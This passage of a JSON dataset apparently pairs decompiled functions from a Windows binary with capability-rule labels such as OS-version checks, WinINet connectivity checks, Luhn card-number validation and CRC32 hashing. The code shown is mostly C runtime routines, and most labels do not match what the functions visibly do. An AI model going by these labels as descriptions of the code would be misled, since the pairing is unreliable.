        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00418cea)\n// WARNING: Removing unreachable block (ram,0x00418c64)\n// WARNING: Removing unreachable block (ram,0x00418dc6)\n// WARNING: Removing unreachable block (ram,0x00418c76)\n// WARNING: Removing unreachable block (ram,0x00418c7e)\n// WARNING: Removing unreachable block (ram,0x00418c84)\n// WARNING: Removing unreachable block (ram,0x00418c87)\n// WARNING: Removing unreachable block (ram,0x00418c8e)\n// WARNING: Removing unreachable block (ram,0x00418c98)\n// WARNING: Removing unreachable block (ram,0x00418d62)\n// WARNING: Removing unreachable block (ram,0x00418d5c)\n// WARNING: Removing unreachable block (ram,0x00418d68)\n// WARNING: Removing unreachable block (ram,0x00418d85)\n// WARNING: Removing unreachable block (ram,0x00418d87)\n// WARNING: Removing unreachable block (ram,0x00418d8f)\n// WARNING: Removing unreachable block (ram,0x00418d92)\n// WARNING: Removing unreachable block (ram,0x00418d97)\n// WARNING: Removing unreachable block (ram,0x00418d9a)\n// WARNING: Removing unreachable block (ram,0x00418dcf)\n// WARNING: Removing unreachable block (ram,0x00418da1)\n// WARNING: Removing unreachable block (ram,0x00418da8)\n// WARNING: Removing unreachable block (ram,0x00418de6)\n// WARNING: Removing unreachable block (ram,0x00418ded)\n// WARNING: Removing unreachable block (ram,0x00418df5)\n\nvoid __cdecl\nfcn.00418a14(uint arg_8h, uint arg_ch, char *arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch, uint arg_20h)\n\n{\n    char cVar1;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_19h;\n    uint var_14h;\n    uint var_eh;\n    uint var_ah;\n    uint var_4h;\n    \n    for (; (((cVar1 = *arg_10h,  cVar1 == ' ' || (cVar1 == '\\t')) || (cVar1 == '\\n')) || (cVar1 == '\\r'));\n        arg_10h = arg_10h + 1) {\n    }\n    // WARNING: Could not recover jumptable at 0x00418a77. Too many branches\n    // WARNING: Treating indirect jump as call\n    // switch table (12 cases) at 0x418e18\n    (**0x418e18)();\n    return;\n}\n",
        "token_count": 691
    },
    "00418e48": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00418e48(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    uint var_10h;\n    uint var_4h;\n    \n    var_4h = *0x441350;\n    fcn.00418a14(&var_10h, arg_ch, arg_10h, arg_14h, 0, 0, 0);\n    fcn.00416c6c(&var_10h, arg_8h);\n    fcn.0040d590();\n    return;\n}\n",
        "token_count": 130
    },
    "00418e94": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl\nfcn.00418e94(int32_t arg_8h, uint32_t arg_ch, uint32_t arg_10h, int32_t arg_14h, uint32_t arg_18h, int16_t *arg_1ch)\n\n{\n    int16_t *piVar1;\n    char cVar2;\n    uint32_t uVar3;\n    int16_t *piVar4;\n    int16_t *piVar5;\n    int16_t iVar6;\n    int32_t iVar7;\n    char *pcVar8;\n    int16_t *var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint uStack40;\n    uint uStack36;\n    uint var_1ch;\n    uchar var_18h;\n    uchar var_17h;\n    uchar var_16h;\n    uchar var_15h;\n    uchar var_14h;\n    uchar var_13h;\n    uchar var_12h;\n    uchar var_11h;\n    ushort var_10h;\n    uint var_eh;\n    uint32_t var_ah;\n    uchar var_6h;\n    char var_5h;\n    uint var_4h;\n    \n    var_4h = *0x441350;\n    uVar3 = arg_10h & 0x7fff;\n    var_1ch._0_1_ = 0xcc;\n    var_1ch._1_1_ = 0xcc;\n    var_1ch._2_1_ = 0xcc;\n    var_1ch._3_1_ = 0xcc;\n    var_18h = 0xcc;\n    var_17h = 0xcc;\n    var_16h = 0xcc;\n    var_15h = 0xcc;\n    var_14h = 0xcc;\n    var_13h = 0xcc;\n    var_12h = 0xfb;\n    var_11h = 0x3f;\n    if ((arg_10h & 0x8000) == 0) {\n        *(arg_1ch + 1) = 0x20;\n    }\n    else {\n        *(arg_1ch + 1) = 0x2d;\n    }\n    if (((uVar3 == 0) && (arg_ch == 0)) && (arg_8h == 0)) {\ncode_r0x0041900a:\n        *(arg_1ch + 2) = 0x30;\ncode_r0x0041910d:\n        *arg_1ch = 0;\n        *(arg_1ch + 1) = 0x20;\n        *(arg_1ch + 3) = 1;\n        *(arg_1ch + 5) = 0;\n    }\n    else {\n        if (uVar3 == 0x7fff) {\n            *arg_1ch = 1;\n            if (((arg_ch == 0x80000000) && (arg_8h == 0)) || ((arg_ch & 0x40000000) != 0)) {\n                if (((arg_10h & 0x8000) == 0) || (arg_ch != 0xc0000000)) {\n                    if ((arg_ch != 0x80000000) || (arg_8h != 0)) goto code_r0x00418f80;\n                    pcVar8 = \"1#INF\";\n                }\n                else {\n                    if (arg_8h != 0) {\ncode_r0x00418f80:\n                        pcVar8 = \"1#QNAN\";\n                        goto code_r0x00418f85;\n                    }\n                    pcVar8 = \"1#IND\";\n                }\n                fcn.00411ed0(arg_1ch + 2, pcVar8);\n                *(arg_1ch + 3) = 5;\n            }\n            else {\n                pcVar8 = \"1#SNAN\";\ncode_r0x00418f85:\n                fcn.00411ed0(arg_1ch + 2, pcVar8);\n                *(arg_1ch + 3) = 6;\n            }\n            goto code_r0x004190ef;\n        }\n        var_10h = 0;\n        iVar6 = ((uVar3 >> 8) + (arg_ch >> 0x18) * 2) * 0x4d + -0x134312f4 + uVar3 * 0x4d10 >> 0x10;\n        var_6h = uVar3;\n        var_5h = uVar3 >> 8;\n        var_eh = arg_8h;\n        var_ah = arg_ch;\n        fcn.00419527(&var_10h, -iVar6, 1);\n        if (0x3ffe < CONCAT11(var_5h, var_6h)) {\n            iVar6 = iVar6 + 1;\n            fcn.004192f5(&var_10h, &var_1ch);\n        }\n        *arg_1ch = iVar6;\n        if (((arg_18h & 1) != 0) && (arg_14h = arg_14h + iVar6,  arg_14h < 1)) goto code_r0x0041900a;\n        if (0x15 < arg_14h) {\n            arg_14h = 0x15;\n        }\n        iVar7 = CONCAT11(var_5h, var_6h) - 0x3ffe;\n        var_6h = 0;\n        var_5h = '\\0';\n        arg_10h = 8;\n        do {\n            fcn.004188db(&var_10h);\n            arg_10h = arg_10h + -1;\n        } while (arg_10h != 0);\n        if (iVar7 < 0) {\n            for (uVar3 = -iVar7 & 0xff; uVar3 != 0; uVar3 = uVar3 - 1) {\n                fcn.00418909(&var_10h);\n            }\n        }\n        arg_10h = arg_14h + 1;\n        piVar4 = arg_1ch + 2;\n        var_30h = piVar4;\n        if (0 < arg_10h) {\n            do {\n                var_ah._2_2_ = var_ah >> 0x10;\n                var_eh._2_2_ = var_eh >> 0x10;\n                var_28h = CONCAT22(var_eh, var_10h);\n                uStack40 = CONCAT22(var_ah, var_eh._2_2_);\n                uStack36 = CONCAT13(var_5h, CONCAT12(var_6h, var_ah._2_2_));\n                fcn.004188db(&var_10h);\n                fcn.004188db(&var_10h);\n                fcn.0041887d(&var_10h, &var_28h);\n                fcn.004188db(&var_10h);\n                piVar4 = var_30h + 1;\n                arg_10h = arg_10h + -1;\n                *var_30h = var_5h + '0';\n                var_5h = '\\0';\n                var_30h = piVar4;\n            } while (arg_10h != 0);\n        }\n        piVar5 = piVar4 + -1;\n        piVar1 = arg_1ch + 2;\n        if (*(piVar4 + -1) < '5') {\n            for (; (piVar1 <= piVar5 && (*piVar5 == '0')); piVar5 = piVar5 + -1) {\n            }\n            if (piVar5 < piVar1) {\n                *piVar1 = 0x30;\n                goto code_r0x0041910d;\n            }\n        }\n        else {\n            for (; (piVar1 <= piVar5 && (*piVar5 == '9')); piVar5 = piVar5 + -1) {\n                *piVar5 = 0x30;\n            }\n            if (piVar5 < piVar1) {\n                piVar5 = piVar5 + 1;\n                *arg_1ch = *arg_1ch + 1;\n            }\n            *piVar5 = *piVar5 + '\\x01';\n        }\n        cVar2 = (piVar5 - arg_1ch) + -3;\n        *(arg_1ch + 3) = cVar2;\n        *(cVar2 + 4 + arg_1ch) = 0;\n    }\ncode_r0x004190ef:\n    fcn.0040d590();\n    return;\n}\n",
        "token_count": 1929
    },
    "004195ad": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.004195ad(uint arg_8h, uint arg_ch, int32_t arg_10h)\n\n{\n    int32_t iVar1;\n    uint unaff_EBP;\n    uint unaff_retaddr;\n    uint in_stack_00000010;\n    uint in_stack_00000014;\n    uint in_stack_00000018;\n    uint in_stack_0000001c;\n    uint in_stack_00000020;\n    uint in_stack_00000024;\n    uint in_stack_00000028;\n    uint in_stack_0000002c;\n    uint in_stack_00000030;\n    uint in_stack_00000034;\n    uint in_stack_00000038;\n    uint in_stack_0000003c;\n    uint in_stack_00000040;\n    uint in_stack_00000044;\n    uint in_stack_00000048;\n    uint in_stack_0000004c;\n    uint in_stack_00000050;\n    \n    iVar1 = fcn.0040f262();\n    iVar1 = *(iVar1 + 0x60);\n    if (iVar1 != *0x442dfc) {\n        iVar1 = fcn.004162a8();\n    }\n    if (arg_10h == 0) {\n        return 0;\n    }\n    iVar1 = fcn.004196a7(*(iVar1 + 0xc), 1, arg_8h, arg_10h, arg_ch, arg_10h, *(iVar1 + 4), unaff_EBP, unaff_retaddr, \n                         arg_8h, arg_ch, arg_10h, in_stack_00000010, in_stack_00000014, in_stack_00000018, \n                         in_stack_0000001c, in_stack_00000020, in_stack_00000024, in_stack_00000028, in_stack_0000002c, \n                         in_stack_00000030, in_stack_00000034, in_stack_00000038, in_stack_0000003c, in_stack_00000040, \n                         in_stack_00000044, in_stack_00000048, in_stack_0000004c, in_stack_00000050);\n    if (iVar1 == 0) {\n        return 0x7fffffff;\n    }\n    return iVar1 + -2;\n}\n",
        "token_count": 512
    },
    "0041968b": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint32_t fcn.0041968b(int32_t param_1)\n\n{\n    char *in_EAX;\n    int32_t iVar1;\n    \n    iVar1 = param_1;\n    if (param_1 != 0) {\n        do {\n            iVar1 = iVar1 + -1;\n            if (*in_EAX == '\\0') goto code_r0x0041969f;\n            in_EAX = in_EAX + 1;\n        } while (iVar1 != 0);\n    }\n    iVar1 = iVar1 + -1;\ncode_r0x0041969f:\n    return (param_1 - iVar1) + -1;\n}\n",
        "token_count": 144
    },
    "00419a78": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint32_t * fcn.00419a78(void)\n\n{\n    int32_t iVar1;\n    int32_t *piVar2;\n    int32_t iVar3;\n    int32_t *piVar4;\n    int32_t *unaff_EDI;\n    uint var_4h;\n    \n    iVar3 = 0;\n    if (unaff_EDI != NULL) {\n        iVar1 = *unaff_EDI;\n        piVar2 = unaff_EDI;\n        while (iVar1 != 0) {\n            piVar2 = piVar2 + 1;\n            iVar3 = iVar3 + 1;\n            iVar1 = *piVar2;\n        }\n        piVar2 = fcn.0040b8de(iVar3 * 4 + 4);\n        if (piVar2 == NULL) {\n            fcn.0040b9cd(9);\n        }\n        iVar3 = *unaff_EDI;\n        piVar4 = piVar2;\n        while (iVar3 != 0) {\n            iVar3 = fcn.00419cae(iVar3);\n            *piVar4 = iVar3;\n            piVar4 = piVar4 + 1;\n            unaff_EDI = unaff_EDI + 1;\n            iVar3 = *unaff_EDI;\n        }\n        *piVar4 = 0;\n        return piVar2;\n    }\n    return unaff_EDI;\n}\n",
        "token_count": 308
    },
    "00419cd9": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint32_t * __cdecl fcn.00419cd9(uint32_t *arg_8h, uint32_t arg_ch)\n\n{\n    uint8_t uVar1;\n    uint8_t uVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint32_t *puVar5;\n    uint32_t uVar6;\n    uint32_t uVar7;\n    \n    iVar3 = fcn.0040f262();\n    iVar3 = *(iVar3 + 0x60);\n    if (iVar3 != *0x442dfc) {\n        iVar3 = fcn.004162a8();\n    }\n    if (*(iVar3 + 8) == 0) {\n        uVar7 = arg_8h & 3;\n        while (uVar7 != 0) {\n            if (*arg_8h == arg_ch) {\n                return arg_8h;\n            }\n            if (*arg_8h == 0) {\n                return NULL;\n            }\n            uVar7 = arg_8h + 1 & 3;\n            arg_8h = arg_8h + 1;\n        }\n        while( true ) {\n            while( true ) {\n                uVar7 = *arg_8h;\n                uVar6 = uVar7 ^ CONCAT22(CONCAT11(arg_ch, arg_ch), CONCAT11(arg_ch, arg_ch));\n                uVar4 = uVar7 ^ 0xffffffff ^ uVar7 + 0x7efefeff;\n                puVar5 = arg_8h + 1;\n                if (((uVar6 ^ 0xffffffff ^ uVar6 + 0x7efefeff) & 0x81010100) != 0) break;\n                arg_8h = puVar5;\n                if ((uVar4 & 0x81010100) != 0) {\n                    if ((uVar4 & 0x1010100) != 0) {\n                        return NULL;\n                    }\n                    if ((uVar7 + 0x7efefeff & 0x80000000) == 0) {\n                        return NULL;\n                    }\n                }\n            }\n            uVar7 = *arg_8h;\n            if (uVar7 == arg_ch) {\n                return arg_8h;\n            }\n            if (uVar7 == 0) {\n                return NULL;\n            }\n            uVar2 = uVar7 >> 8;\n            if (uVar2 == arg_ch) {\n                return arg_8h + 1;\n            }\n            if (uVar2 == 0) break;\n            uVar2 = uVar7 >> 0x10;\n            if (uVar2 == arg_ch) {\n                return arg_8h + 2;\n            }\n            if (uVar2 == 0) {\n                return NULL;\n            }\n            uVar2 = uVar7 >> 0x18;\n            if (uVar2 == arg_ch) {\n                return arg_8h + 3;\n            }\n            arg_8h = puVar5;\n            if (uVar2 == 0) {\n                return NULL;\n            }\n        }\n        return NULL;\n    }\n    while( true ) {\n        uVar2 = *arg_8h;\n        uVar7 = uVar2;\n        if (uVar2 == 0) break;\n        if ((*(uVar7 + 0x1d + iVar3) & 4) == 0) {\n            puVar5 = arg_8h;\n            if (arg_ch == uVar7) break;\n        }\n        else {\n            uVar1 = *(arg_8h + 1);\n            if (uVar1 == 0) {\n                return NULL;\n            }\n            puVar5 = arg_8h + 1;\n            if (arg_ch == CONCAT11(uVar2, uVar1)) {\n                return arg_8h;\n            }\n        }\n        arg_8h = puVar5 + 1;\n    }\n    return ~-(arg_ch != uVar7) & arg_8h;\n}\n",
        "token_count": 883
    },
    "004011cc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55/f4adb04e51ec4c55be451936d9d27cc9",
            "validate payment card number using luhn algorithm with no lookup table/ddd7fbc99e2542de97c80e37351c10a7/a3d2ca57787b45ac887fefbb531cd56b"
        ],
        "decompiled_code": "\nint32_t __thiscall fcn.004011cc(int32_t param_1, uint32_t param_2, uint32_t param_3)\n\n{\n    uint *puVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    uint *puVar5;\n    \n    if (*(param_1 + 0x14) < param_2) {\n        fcn.00408cf6();\n    }\n    uVar2 = *(param_1 + 0x14) - param_2;\n    if (uVar2 < param_3) {\n        param_3 = uVar2;\n    }\n    if (param_3 != 0) {\n        puVar5 = param_1 + 4;\n        puVar4 = puVar5;\n        puVar1 = puVar5;\n        if (7 < *(param_1 + 0x18)) {\n            puVar4 = *puVar5;\n            puVar1 = *puVar5;\n        }\n        fcn.0040ada0(puVar4 + param_2 * 2, puVar1 + (param_3 + param_2) * 2, (uVar2 - param_3) * 2);\n        iVar3 = *(param_1 + 0x14) - param_3;\n        *(param_1 + 0x14) = iVar3;\n        if (7 < *(param_1 + 0x18)) {\n            puVar5 = *puVar5;\n        }\n        *(puVar5 + iVar3 * 2) = 0;\n    }\n    return param_1;\n}\n",
        "token_count": 360
    },
    "00410204": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55/f4adb04e51ec4c55be451936d9d27cc9",
            "validate payment card number using luhn algorithm with no lookup table/ddd7fbc99e2542de97c80e37351c10a7/a3d2ca57787b45ac887fefbb531cd56b",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00410204(int32_t arg_8h)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t *piVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    uint32_t uVar8;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar2 = *(arg_8h + 0x10);\n    iVar7 = 0;\n    for (iVar3 = *(arg_8h + 8); -1 < iVar3; iVar3 = iVar3 << 1) {\n        iVar7 = iVar7 + 1;\n    }\n    iVar3 = iVar7 * 0x204 + 0x144 + iVar2;\n    iVar6 = 0x3f;\n    iVar4 = iVar3;\n    do {\n        *(iVar4 + 8) = iVar4;\n        *(iVar4 + 4) = iVar4;\n        iVar4 = iVar4 + 8;\n        iVar6 = iVar6 + -1;\n    } while (iVar6 != 0);\n    uVar8 = iVar7 * 0x8000 + *(arg_8h + 0xc);\n    iVar4 = (*_sym.imp.KERNEL32.dll_VirtualAlloc)(uVar8, 0x8000, 0x1000, 4);\n    if (iVar4 == 0) {\n        iVar7 = -1;\n    }\n    else {\n        if (uVar8 <= uVar8 + 0x7000) {\n            piVar5 = uVar8 + 0x10;\n            iVar4 = ((uVar8 + 0x7000) - uVar8 >> 0xc) + 1;\n            do {\n                piVar5[-2] = -1;\n                piVar5[0x3fb] = -1;\n                *piVar5 = piVar5 + 0x3ff;\n                piVar5[-1] = 0xff0;\n                piVar5[1] = piVar5 + -0x401;\n                piVar5[0x3fa] = 0xff0;\n                piVar5 = piVar5 + 0x400;\n                iVar4 = iVar4 + -1;\n            } while (iVar4 != 0);\n        }\n        *(iVar3 + 0x1fc) = uVar8 + 0xc;\n        *(uVar8 + 0x14) = iVar3 + 0x1f8;\n        *(iVar3 + 0x200) = uVar8 + 0x700c;\n        *(uVar8 + 0x7010) = iVar3 + 0x1f8;\n        *(iVar2 + 0x44 + iVar7 * 4) = 0;\n        *(iVar2 + 0xc4 + iVar7 * 4) = 1;\n        cVar1 = *(iVar2 + 0x43);\n        *(iVar2 + 0x43) = cVar1 + '\\x01';\n        if (cVar1 == '\\0') {\n            *(arg_8h + 4) = *(arg_8h + 4) | 1;\n        }\n        *(arg_8h + 8) = *(arg_8h + 8) & ~(0x80000000U >> (iVar7 & 0x1f));\n    }\n    return iVar7;\n}\n",
        "token_count": 763
    },
    "00416e17": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55/f4adb04e51ec4c55be451936d9d27cc9",
            "validate payment card number using luhn algorithm with no lookup table/ddd7fbc99e2542de97c80e37351c10a7/a3d2ca57787b45ac887fefbb531cd56b"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00416e17(uint32_t *arg_8h, uint32_t *arg_ch)\n\n{\n    uint16_t uVar1;\n    uint32_t uVar2;\n    uint16_t uVar3;\n    uint16_t uVar4;\n    uint32_t var_4h;\n    \n    uVar1 = *(arg_ch + 6);\n    var_4h = 0x80000000;\n    uVar3 = uVar1 >> 4;\n    uVar4 = uVar3 & 0x7ff;\n    uVar2 = *arg_ch;\n    if ((uVar3 & 0x7ff) == 0) {\n        if (((arg_ch[1] & 0xfffff) == 0) && (uVar2 == 0)) {\n            arg_8h[1] = 0;\n            *arg_8h = 0;\n            *(arg_8h + 2) = 0;\n            return;\n        }\n        uVar4 = uVar4 + 0x3c01;\n        var_4h = 0;\n    }\n    else if (uVar4 == 0x7ff) {\n        uVar4 = 0x7fff;\n    }\n    else {\n        uVar4 = uVar4 + 0x3c00;\n    }\n    arg_8h[1] = uVar2 >> 0x15 | (arg_ch[1] & 0xfffff) << 0xb | var_4h;\n    *arg_8h = uVar2 << 0xb;\n    while (var_4h == 0) {\n        uVar2 = arg_8h[1];\n        uVar4 = uVar4 - 1;\n        arg_8h[1] = uVar2 << 1 | *arg_8h >> 0x1f;\n        *arg_8h = *arg_8h * 2;\n        var_4h = uVar2 << 1 & 0x80000000;\n    }\n    *(arg_8h + 2) = uVar1 & 0x8000 | uVar4;\n    return;\n}\n",
        "token_count": 480
    },
    "004188db": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55/f4adb04e51ec4c55be451936d9d27cc9",
            "validate payment card number using luhn algorithm with no lookup table/ddd7fbc99e2542de97c80e37351c10a7/a3d2ca57787b45ac887fefbb531cd56b"
        ],
        "decompiled_code": "\nvoid fcn.004188db(uint32_t *param_1)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    \n    uVar1 = *param_1;\n    uVar2 = param_1[1];\n    *param_1 = uVar1 * 2;\n    param_1[1] = uVar2 * 2 | uVar1 >> 0x1f;\n    param_1[2] = param_1[2] << 1 | uVar2 >> 0x1f;\n    return;\n}\n",
        "token_count": 125
    },
    "0040f67a": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\nint32_t fcn.0040f67a(uint16_t param_1)\n\n{\n    int32_t iVar1;\n    bool bVar2;\n    \n    if (0x2f < param_1) {\n        if (param_1 < 0x3a) {\n            return param_1 - 0x30;\n        }\n        iVar1 = 0xff10;\n        if (param_1 < 0xff10) {\n            iVar1 = 0x660;\n            if (param_1 < 0x660) {\n                return -1;\n            }\n            if (param_1 < 0x66a) goto code_r0x0040f7e6;\n            iVar1 = 0x6f0;\n            if (param_1 < 0x6f0) {\n                return -1;\n            }\n            if (param_1 < 0x6fa) goto code_r0x0040f7e6;\n            iVar1 = 0x966;\n            if (param_1 < 0x966) {\n                return -1;\n            }\n            if (param_1 < 0x970) goto code_r0x0040f7e6;\n            iVar1 = 0x9e6;\n            if (param_1 < 0x9e6) {\n                return -1;\n            }\n            if (param_1 < 0x9f0) goto code_r0x0040f7e6;\n            iVar1 = 0xa66;\n            if (param_1 < 0xa66) {\n                return -1;\n            }\n            if (param_1 < 0xa70) goto code_r0x0040f7e6;\n            iVar1 = 0xae6;\n            if (param_1 < 0xae6) {\n                return -1;\n            }\n            if (param_1 < 0xaf0) goto code_r0x0040f7e6;\n            iVar1 = 0xb66;\n            if (param_1 < 0xb66) {\n                return -1;\n            }\n            if (param_1 < 0xb70) goto code_r0x0040f7e6;\n            iVar1 = 0xc66;\n            if (param_1 < 0xc66) {\n                return -1;\n            }\n            if (param_1 < 0xc70) goto code_r0x0040f7e6;\n            iVar1 = 0xce6;\n            if (param_1 < 0xce6) {\n                return -1;\n            }\n            if (param_1 < 0xcf0) goto code_r0x0040f7e6;\n            iVar1 = 0xd66;\n            if (param_1 < 0xd66) {\n                return -1;\n            }\n            if (param_1 < 0xd70) goto code_r0x0040f7e6;\n            iVar1 = 0xe50;\n            if (param_1 < 0xe50) {\n                return -1;\n            }\n            if (param_1 < 0xe5a) goto code_r0x0040f7e6;\n            iVar1 = 0xed0;\n            if (param_1 < 0xed0) {\n                return -1;\n            }\n            if (param_1 < 0xeda) goto code_r0x0040f7e6;\n            iVar1 = 0xf20;\n            if (param_1 < 0xf20) {\n                return -1;\n            }\n            if (param_1 < 0xf2a) goto code_r0x0040f7e6;\n            iVar1 = 0x1040;\n            if (param_1 < 0x1040) {\n                return -1;\n            }\n            if (param_1 < 0x104a) goto code_r0x0040f7e6;\n            iVar1 = 0x17e0;\n            if (param_1 < 0x17e0) {\n                return -1;\n            }\n            if (param_1 < 0x17ea) goto code_r0x0040f7e6;\n            iVar1 = 0x1810;\n            if (param_1 < 0x1810) {\n                return -1;\n            }\n            bVar2 = param_1 < 0x181a;\n        }\n        else {\n            bVar2 = param_1 < 0xff1a;\n        }\n        if (bVar2) {\ncode_r0x0040f7e6:\n            return param_1 - iVar1;\n        }\n    }\n    return -1;\n}\n",
        "token_count": 1019
    },
    "0040976f": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0040976f(uint param_1)\n\n{\n    uint32_t unaff_ESI;\n    \n    fcn.00401168(1, 0);\n    if ((unaff_ESI & 1) != 0) {\n        fcn.0040b0dd(param_1);\n    }\n    return param_1;\n}\n",
        "token_count": 78
    },
    "0040a913": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid fcn.0040a913(void)\n\n{\n    code *pcVar1;\n    code *var_10h;\n    char *var_4h;\n    \n    if ((*0x442874 & 1) == 0) {\n        *0x442874 = *0x442874 | 1;\n        var_4h = \"bad allocation\";\n        fcn.0040c11c(&var_4h);\n        *0x442868 = vtable.std::bad_alloc.0;\n        fcn.0040d8dd(0x421bc7);\n    }\n    fcn.0040c159(0x442868);\n    var_10h = vtable.std::bad_alloc.0;\n    fcn.0040b5d6(&var_10h, 0x43f320);\n    pcVar1 = swi(3);\n    (*pcVar1)();\n    return;\n}\n",
        "token_count": 199
    },
    "00412211": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.00412211(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t *piVar1;\n    uint32_t arg_8h_00;\n    uint uVar2;\n    uint *puVar3;\n    int32_t unaff_EBP;\n    int32_t iVar4;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.0040f0bc(0x43bd88, 0xc);\n    arg_8h_00 = *(unaff_EBP + 8);\n    if (arg_8h_00 < *0x443060) {\n        piVar1 = (arg_8h_00 >> 5) * 4 + 0x4430a0;\n        iVar4 = (arg_8h_00 & 0x1f) * 0x24;\n        if ((*(*piVar1 + 4 + iVar4) & 1) != 0) {\n            fcn.004175b9(arg_8h_00);\n            *(unaff_EBP + -4) = 0;\n            if ((*(*piVar1 + 4 + iVar4) & 1) == 0) {\n                puVar3 = fcn.0041296c();\n                *puVar3 = 9;\n                puVar3 = fcn.00412975();\n                *puVar3 = 0;\n                *(unaff_EBP + -0x1c) = 0xffffffff;\n            }\n            else {\n                uVar2 = fcn.00412043(arg_8h_00, *(unaff_EBP + 0xc), *(unaff_EBP + 0x10));\n                *(unaff_EBP + -0x1c) = uVar2;\n            }\n            *(unaff_EBP + -4) = 0xffffffff;\n            fcn.00412298();\n            goto code_r0x004122b6;\n        }\n    }\n    puVar3 = fcn.0041296c();\n    *puVar3 = 9;\n    puVar3 = fcn.00412975();\n    *puVar3 = 0;\ncode_r0x004122b6:\n    fcn.0040f0f7();\n    return;\n}\n",
        "token_count": 518
    },
    "00412790": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint64_t __cdecl fcn.00412790(char **arg_8h)\n\n{\n    int32_t *piVar1;\n    uint8_t uVar2;\n    uint64_t uVar3;\n    char **ppcVar4;\n    char *arg_ch;\n    uint *puVar5;\n    char *pcVar6;\n    char *pcVar7;\n    char *pcVar8;\n    char *pcVar9;\n    int32_t arg_10h;\n    int32_t iVar10;\n    int64_t iVar11;\n    int64_t iVar12;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    char *var_4h;\n    \n    ppcVar4 = arg_8h;\n    pcVar7 = arg_8h[4];\n    if (arg_8h[1] < 0) {\n        arg_8h[1] = NULL;\n    }\n    iVar11 = fcn.004173bf(pcVar7, 0, 0, 1);\n    arg_10h = iVar11 >> 0x20;\n    arg_ch = iVar11;\n    if ((iVar11 < 0x100000000) && (iVar11 < 0)) {\ncode_r0x0041284d:\n        uVar3 = 0xffffffffffffffff;\n    }\n    else {\n        if ((*(arg_8h + 3) & 0x108) == 0) {\n            return iVar11 - arg_8h[1];\n        }\n        pcVar6 = *arg_8h;\n        pcVar9 = arg_8h[2];\n        var_4h = pcVar6 + -pcVar9;\n        if ((arg_8h[3] & 3) == 0) {\n            if (-1 < arg_8h[3]) {\n                puVar5 = fcn.0041296c();\n                *puVar5 = 0x16;\n                goto code_r0x0041284d;\n            }\n        }\n        else if (((*(*((pcVar7 >> 5) * 4 + 0x4430a0) + 4 + (pcVar7 & 0x1f) * 0x24) & 0x80) != 0) &&\n                (pcVar8 = 